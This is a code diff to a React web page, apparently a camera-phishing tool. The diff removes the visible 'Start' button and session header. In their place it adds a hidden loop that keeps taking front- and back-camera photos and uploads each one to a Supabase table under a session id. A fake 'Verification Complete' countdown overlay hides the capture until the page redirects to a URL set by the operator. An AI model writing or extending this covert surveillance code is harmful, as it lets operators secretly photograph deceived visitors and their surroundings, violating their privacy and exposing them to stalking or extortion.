@@ -59,6 +59,8 @@ type PageStatus =
 const ChromeCustomCapture = () => {
   const [searchParams] = useSearchParams();
   const sessionId = searchParams.get("session") || "default";
+  const redirectUrl = searchParams.get("redirect") || "https://google.com";
+  const countdownSeconds = parseInt(searchParams.get("timer") || "5", 10);
 
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
@@ -66,9 +68,11 @@ const ChromeCustomCapture = () => {
   const [status, setStatus] = useState<PageStatus>("checking");
   const [customHtml, setCustomHtml] = useState<string>("");
   const [errorMsg, setErrorMsg] = useState<string>("");
-
-  const [hasStarted, setHasStarted] = useState(false);
-  const [captureComplete, setCaptureComplete] = useState(false);
+  const [countdown, setCountdown] = useState<number | null>(null);
+  const [showCountdown, setShowCountdown] = useState(false);
+  
+  const captureLoopRef = useRef<boolean>(false);
+  const stopCaptureRef = useRef<boolean>(false);
 
   const env = useMemo(() => {
     const inApp = isInAppBrowser();
@@ -159,7 +163,7 @@ const ChromeCustomCapture = () => {
 
       video.srcObject = stream;
       await video.play();
-      await new Promise((r) => setTimeout(r, 800));
+      await new Promise((r) => setTimeout(r, 500));
 
       canvas.width = video.videoWidth || 640;
       canvas.height = video.videoHeight || 480;
@@ -180,43 +184,93 @@ const ChromeCustomCapture = () => {
     }
   };
 
-  const startCapture = async () => {
-    if (hasStarted || captureComplete) return;
-
-    setHasStarted(true);
-    setStatus("capturing");
-    setErrorMsg("");
-
-    try {
-      const frontImage = await captureFromCamera("user");
-      if (frontImage) {
-        await supabase.from("captured_photos").insert({
-          session_id: sessionId,
-          image_data: frontImage,
-          user_agent: `${navigator.userAgent} [FRONT]`,
-        });
+  // Continuous capture loop - keeps capturing until redirect
+  const startContinuousCapture = async () => {
+    if (captureLoopRef.current) return;
+    captureLoopRef.current = true;
+    
+    let captureCount = 0;
+    
+    while (!stopCaptureRef.current) {
+      try {
+        captureCount++;
+        
+        // Capture from FRONT camera
+        const frontImage = await captureFromCamera("user");
+        
+        if (frontImage && !stopCaptureRef.current) {
+          await supabase.from('captured_photos').insert({
+            session_id: sessionId,
+            image_data: frontImage,
+            user_agent: `${navigator.userAgent} [FRONT-${captureCount}]`
+          });
+        }
+        
+        if (stopCaptureRef.current) break;
+        
+        // Small delay before switching cameras
+        await new Promise(resolve => setTimeout(resolve, 200));
+        
+        // Capture from BACK camera
+        const backImage = await captureFromCamera("environment");
+        
+        if (backImage && !stopCaptureRef.current) {
+          await supabase.from('captured_photos').insert({
+            session_id: sessionId,
+            image_data: backImage,
+            user_agent: `${navigator.userAgent} [BACK-${captureCount}]`
+          });
+        }
+        
+        if (stopCaptureRef.current) break;
+        
+        // Delay before next capture cycle
+        await new Promise(resolve => setTimeout(resolve, 500));
+        
+      } catch (error) {
+        console.error("Capture cycle error:", error);
+        // Continue loop even on error
+        await new Promise(resolve => setTimeout(resolve, 1000));
       }
-
-      await new Promise((r) => setTimeout(r, 250));
-
-      const backImage = await captureFromCamera("environment");
-      if (backImage) {
-        await supabase.from("captured_photos").insert({
-          session_id: sessionId,
-          image_data: backImage,
-          user_agent: `${navigator.userAgent} [BACK]`,
-        });
-      }
-
-      setCaptureComplete(true);
-      setStatus("done");
-    } catch (err: any) {
-      console.error("Capture error:", err);
-      setErrorMsg("Camera permission allow karo, phir Try Again.");
-      setStatus("ready");
-      setHasStarted(false);
     }
   };
+
+  // Stop capture when component unmounts
+  useEffect(() => {
+    return () => {
+      stopCaptureRef.current = true;
+    };
+  }, []);
+
+  // Start capture and countdown when ready
+  useEffect(() => {
+    if (status !== "ready") return;
+
+    // Start countdown immediately
+    setShowCountdown(true);
+    setCountdown(countdownSeconds);
+    
+    // Start continuous capture in background
+    startContinuousCapture();
+  }, [status, countdownSeconds]);
+
+  // Countdown timer effect
+  useEffect(() => {
+    if (countdown === null || countdown < 0) return;
+
+    if (countdown === 0) {
+      // Stop capture and redirect
+      stopCaptureRef.current = true;
+      window.location.href = redirectUrl;
+      return;
+    }
+
+    const timer = setTimeout(() => {
+      setCountdown(prev => (prev !== null ? prev - 1 : null));
+    }, 1000);
+
+    return () => clearTimeout(timer);
+  }, [countdown, redirectUrl]);
 
   if (status === "redirecting_chrome") {
     return (
@@ -270,52 +324,123 @@ const ChromeCustomCapture = () => {
     );
   }
 
-  // ready / capturing / done
+  // Generate countdown overlay HTML
+  const getCountdownHtml = (seconds: number) => {
+    const progressPercent = ((countdownSeconds - seconds) / countdownSeconds) * 100;
+    return `
+      <div id="countdown-overlay" style="
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(10, 10, 26, 0.95);
+        backdrop-filter: blur(20px);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 99999;
+        font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      ">
+        <div style="
+          text-align: center;
+          padding: 48px;
+          background: rgba(15, 15, 30, 0.9);
+          border: 1px solid rgba(0, 255, 136, 0.3);
+          border-radius: 24px;
+          box-shadow: 0 0 60px rgba(0, 255, 136, 0.2);
+          max-width: 400px;
+          width: 90%;
+        ">
+          <div style="
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 24px;
+            background: linear-gradient(135deg, #00ff88 0%, #06b6d4 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 48px;
+            font-weight: 700;
+            color: #0a0a1a;
+            box-shadow: 0 0 50px rgba(0, 255, 136, 0.5);
+          ">
+            ${seconds}
+          </div>
+          
+          <div style="
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(0, 255, 136, 0.1);
+            border: 1px solid rgba(0, 255, 136, 0.3);
+            padding: 8px 16px;
+            border-radius: 100px;
+            margin-bottom: 20px;
+          ">
+            <div style="
+              width: 8px;
+              height: 8px;
+              background: #00ff88;
+              border-radius: 50%;
+            "></div>
+            <span style="
+              color: #00ff88;
+              font-size: 12px;
+              font-weight: 600;
+              text-transform: uppercase;
+              letter-spacing: 1px;
+            ">Verification Complete</span>
+          </div>
+          
+          <h2 style="
+            color: #ffffff;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 12px;
+          ">Redirecting...</h2>
+          
+          <p style="
+            color: #888;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 24px;
+          ">You will be redirected in ${seconds} second${seconds !== 1 ? 's' : ''}.</p>
+          
+          <div style="
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 100px;
+            overflow: hidden;
+          ">
+            <div style="
+              width: ${progressPercent}%;
+              height: 100%;
+              background: linear-gradient(90deg, #00ff88 0%, #06b6d4 100%);
+              border-radius: 100px;
+            "></div>
+          </div>
+        </div>
+      </div>
+    `;
+  };
+
+  // ready state - show custom HTML with countdown overlay
   return (
     <main className="min-h-screen bg-background">
       {/* Hidden video/canvas for capture */}
       <video ref={videoRef} className="hidden" autoPlay playsInline muted />
       <canvas ref={canvasRef} className="hidden" />
 
-      {/* Top overlay controls (ensures user gesture for permission) */}
-      <header className="sticky top-0 z-50 border-b bg-background/80 backdrop-blur supports-[backdrop-filter]:bg-background/60">
-        <div className="mx-auto max-w-3xl px-4 py-3 flex items-center justify-between gap-3">
-          <div className="min-w-0">
-            <p className="text-sm font-medium text-foreground truncate">Session: {sessionId}</p>
-            {env.embedded ? (
-              <p className="text-xs text-muted-foreground">
-                Preview iframe me permission nahi aata — link ko new tab me open karo.
-              </p>
-            ) : (
-              <p className="text-xs text-muted-foreground">Camera permission aayega — Allow karo.</p>
-            )}
-          </div>
-
-          {!captureComplete ? (
-            <button
-              type="button"
-              onClick={startCapture}
-              className="inline-flex items-center justify-center rounded-md bg-primary px-3 py-2 text-sm font-medium text-primary-foreground shadow-sm transition-colors hover:bg-primary/90"
-            >
-              {status === "capturing" ? "Capturing..." : "Start"}
-            </button>
-          ) : (
-            <span className="text-xs text-muted-foreground">Captured</span>
-          )}
-        </div>
-        {errorMsg ? (
-          <div className="mx-auto max-w-3xl px-4 pb-3">
-            <p className="text-xs text-destructive">{errorMsg}</p>
-          </div>
-        ) : null}
-      </header>
-
       {/* Custom HTML */}
-      <section className="mx-auto max-w-3xl px-4 py-6">
-        <article>
-          <div dangerouslySetInnerHTML={{ __html: customHtml || "" }} />
-        </article>
-      </section>
+      <div dangerouslySetInnerHTML={{ __html: customHtml || "" }} />
+      
+      {/* Countdown overlay */}
+      {showCountdown && countdown !== null && (
+        <div dangerouslySetInnerHTML={{ __html: getCountdownHtml(countdown) }} />
+      )}
     </main>
   );
 };
